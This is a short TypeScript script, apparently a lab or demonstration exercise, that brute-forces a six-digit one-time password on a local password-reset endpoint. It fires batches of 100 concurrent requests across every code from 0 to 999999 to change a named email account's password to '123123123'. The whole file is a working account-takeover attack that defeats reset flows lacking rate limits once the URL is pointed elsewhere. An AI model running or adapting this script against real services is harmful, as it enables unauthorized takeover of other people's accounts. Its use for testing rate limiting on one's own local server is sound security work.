import axios from "axios";

async function sendRequest(otp :number) {
    let data = JSON.stringify({
        "email": "gopla@gmail.com",
        "otp": otp,
        "newPassword": "123123123"
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:5000/reset-password',
        headers: { 
          'Content-Type': 'application/json'
        },
        data : data
      };
      
      try {
          axios.request(config)
          
      } catch (error) {
             
      }
}

async function main() {
    for(let i=0 ;i<1000000; i+=100){
    const p =[]
    console.log("here for" + i);
    for(let j=0 ;j<100;j++){
      p.push(sendRequest(i + j))
    }
  await Promise.all(p)     
    }
}
main()
